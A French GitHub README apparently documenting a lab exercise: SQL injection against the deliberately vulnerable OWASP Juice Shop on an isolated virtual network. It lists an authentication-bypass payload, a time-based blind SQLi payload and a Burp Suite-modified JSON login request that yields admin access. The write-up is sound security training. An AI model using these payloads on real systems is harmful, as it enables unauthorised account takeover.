# Projet n°2 - Injection SQL sur OWASP Juice Shop

## 📚 Sommaire

1. [ Objectif du projet](#-objectif-du-projet)  
2. [ Environnement de test](#-environnement-de-test)  
3. [ Outils utilisés](#️-outils-utilisés)  
4. [ Étape 1 - Connexion des machines](#-étape-1--connexion-des-machines)  
5. [ Étape 2 - Lancement de Juice Shop](#-étape-2--lancement-de-juice-shop)  
6. [ Étape 3 - Connexion à Juice Shop](#-étape-3--connexion-à-juice-shop)  
7. [ Étape 4 - Injection SQL simple](#-étape-4--injection-sql-simple)  
8. [ Étape 5 - Injection SQL avancée (Blind SQLi)](#-étape-5--injection-sql-avancée-blind-sqli)  
9. [ Attaque via Burp Suite](#-attaque-via-burp-suite)  
10. [ Vocabulaire utile](#-vocabulaire-utile)  
11. [🛡️ Sécurité & Légalité](#️-sécurité--légalité)  
12. [ Suivi des projets GitHub](#-suivi-des-projets-github)  

---

##  Objectif du projet

Simuler une attaque par **SQL Injection** dans un environnement sécurisé et local, via l’application volontairement vulnérable **OWASP Juice Shop**, afin de comprendre les risques liés à l'injection de requêtes SQL.

---

## 🚀 Avancement des étapes du projet

| Étape    | Fonction                                 | Statut       |
|----------|------------------------------------------|--------------|
| Étape 1  | Crawler HTML récursif                    | ✅ Terminé    |
| Étape 2  | Détection d'injections SQL               | ✅ Terminé
| Étape 3  | Détection de failles XSS                 | 🕒 À venir    |
| Étape 4  | Recherche de données sensibles           | 🕒 À venir    |
| Étape 5  | Génération de rapports JSON / Markdown   | 🕒 À venir    |

> 🧭 **Note importante** :  
> Ce projet est divisé en 5 étapes pédagogiques, chacune correspondant à une **fonctionnalité clé**. Les étapes seront publiées progressivement dans le dépôt **CyberCrawler-Python**.

----

##  Environnement de test

| Machine       | OS/Distro         | Rôle        | Adresse IP        |
|---------------|-------------------|-------------|-------------------|
| Parrot OS     | Parrot Security   | Attaquant   | `192.168.100.20`  |
| Debian        | Debian 13         | Victime     | `192.168.100.10`  |

➡️ Les deux machines tournent sur **VirtualBox** en **réseau local (réseau interne isolé)**.
⚠️ À noter :
- Si **vous** souhaitez mettre à jour les paquets ou télécharger des outils depuis Internet, il faudra temporairement repasser en **NAT** ou en **mode bridge**.
- Pour effectuer des tests en environnement isolé et sécurisé, je recommande d'utiliser un **réseau interne VirtualBox (Internal Network)**. Ce mode permet uniquement la communication entre les machines virtuelles et les isole de l'hôte et d'Internet.
---

##  Outils utilisés

| Outil             | Fonction                                           |
|-------------------|----------------------------------------------------|
| Docker            | Déploiement de Juice Shop sur Debian               |
| OWASP Juice Shop  | Application vulnérable à tester                    |
| Firefox           | Navigateur web                                     |
| Burp Suite        | Interception et analyse des requêtes HTTP          |
| Terminal Linux    | Commandes réseau (ping, docker...)                 |

---

##  Étape 1 - Connexion des machines

Depuis Parrot :
ping 192.168.100.10

Depuis Debian :
ping 192.168.100.20

✅ Le ping confirme une communication bidirectionnelle, entre Parrot (attaquant) et Debian (victime).

---

Étape 2 - Lancement de Juice Shop (sur Debian)

cd /root/
sudo ./start_juice.sh
sudo docker ps

       
🟢 Juice Shop est accessible depuis Parrot :
`192.168.100.10:3000`



---
🔓 Étape 3 - Connexion à Juice Shop

ℹ️ Remarque importante : Le service Juice Shop est hébergé sur la machine Debian (victime), mais l'accès à l'interface web se fait depuis Parrot (attaquant) via un navigateur.

URL de connexion (depuis Parrot) :

URL de connexion : `http://192.168.100.10:3000`

---

 Étape 4 - Injection SQL simple  

Champ et Valeur     
Email	' OR 1=1--     
Password : test    

✅ Connexion réussie sans mot de passe grâce à une injection SQL simple.   

---

 Étape 5 - Injection SQL avancée (Blind SQLi)      

Champ et Valeur   
Email	' OR IF(1=1, SLEEP(5), 0)--   
Password : test   

✅ Le serveur prend 5 secondes à répondre, confirmant une Blind SQLi (injection sans message d’erreur).

---

Attaque via Burp Suite

⚙️ Détails techniques :    
	•	Interception de la requête POST /rest/user/login      
	•	Modification manuelle du corps JSON :      

{     
  "email": "' OR 1=1--",     
  "password": "test"     
}      


<p align="center">
  <table>
    <tr>
      <td align="center">
        <a href="https://github.com/virg736/Python-SQLi-JuiceShop-BurpSuite/blob/main/burp-juice-shop-whoami.png">
          <img src="https://github.com/virg736/Python-SQLi-JuiceShop-BurpSuite/blob/main/burp-juice-shop-whoami.png"
               alt="Burp — Connexion admin réussie"
               width="420" style="max-width:100%;height:auto;">
        </a>
        <br><em>Burp — Connexion admin réussie</em>
      </td>
      <td align="center">
        <a href="https://github.com/virg736/Python-SQLi-JuiceShop-BurpSuite/blob/main/owasp-juice-shop-login-admin-advanced.png">
          <img src="https://github.com/virg736/Python-SQLi-JuiceShop-BurpSuite/blob/main/owasp-juice-shop-login-admin-advanced.png"
               alt="OWASP — page admin (Login advanced)"
               width="420" style="max-width:100%;height:auto;">
        </a>
        <br><em>OWASP — page admin (Login advanced)</em>
      </td>
    </tr>
  </table>
</p>
       
         

<p align="center">
  <table>
    <tr>
      <td align="center">
        <a href="https://github.com/virg736/Python-SQLi-JuiceShop-BurpSuite/blob/main/burp-juice-shop-whoami.png">
          <img src="https://github.com/virg736/Python-SQLi-JuiceShop-BurpSuite/blob/main/burp-juice-shop-whoami.png"
               alt="Burp — Connexion admin réussie"
               width="420" style="max-width:100%;height:auto;">
        </a>
        <br><em>Burp - Connexion admin réussie</em>
      </td>
      <td align="center">
        <a href="https://github.com/virg736/Python-SQLi-JuiceShop-BurpSuite/blob/main/owasp-juice-shop-login-admin-success.png">
          <img src="https://github.com/virg736/Python-SQLi-JuiceShop-BurpSuite/blob/main/owasp-juice-shop-login-admin-success.png"
               alt="OWASP — page admin (Login success)"
               width="420" style="max-width:100%;height:auto;">
        </a>
        <br><em>OWASP - page admin (Login success)</em>
      </td>
    </tr>
  </table>
</p>


---

	•	Réception d’un token JWT dans la réponse (preuve d’authentification).  

🔍 Vérification de l’identité (whoami)   

GET /rest/user/whoami   
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...    


✅ Réponse :   

{   
  "user": {   
    "email": "admin@juice-sh.op",   
    "role": "admin",   
    "profileImage": "assets/public/images/uploads/defaultAdmin.png"      
    }        
}        

🔐 Connexion admin réussie via une injection SQL interceptée et modifiée dans Burp Suite.   


<p align="center">
  <img src="https://github.com/virg736/Python-SQLi-JuiceShop-BurpSuite/blob/main/burp-juice-shop-whoami.png"
       alt="Burp Juice Shop - whoami"
       width="850">
  <br>
  <em>Figure - Connexion admin réussie via injection SQL interceptée dans Burp Suite (burp-juice-shop-whoami.png)</em>
</p>


---

## Vocabulaire utile

| Terme        | Définition |
|--------------|------------|
| **Injection SQL** | Code malveillant injecté dans une requête SQL. |
| **Blind SQLi**    | Variante d’injection ne montrant pas de message d’erreur mais provoquant un comportement (ex : `SLEEP`). |
| **Payload**       | Code ou données malveillantes injectées. |
| **Authentification contournée** | Accès à un compte sans identifiants valides. |
| **Pentest**       | Test d’intrusion légal simulant une attaque réelle. |


----


Sécurité & Légalité  

Ce projet a été réalisé dans un environnement local et légal.     
Il est strictement interdit de tester ce type de vulnérabilité sur des systèmes réels sans autorisation explicite.     

 Plateformes d’entraînement légales recommandées :      
	•	OWASP Juice Shop      
	•	DVWA     
	•	bWAPP     

---

✍️ Auteur : *Virginie Lechene*

---

## Licence
Le script est publié sous la licence MIT.

## À propos de l’usage
Ce projet est destiné exclusivement à des fins pédagogiques, notamment dans le cadre de :
- d’une formation en cybersécurité,
- de tests d’intrusion légaux (pentest),
- d’analyses réseau dans un environnement contrôlé.

⚠️ L’auteure ne cautionne ni n’autorise l’utilisation de ce script en dehors d’un cadre légal strictement défini.
Toute utilisation non conforme est interdite et relève uniquement de la responsabilité de l’utilisateur.

## Droits sur les visuels
Les visuels, illustrations ou captures présents dans ce dépôt sont la propriété exclusive de l’auteure.
Toute reproduction ou utilisation non autorisée est interdite.


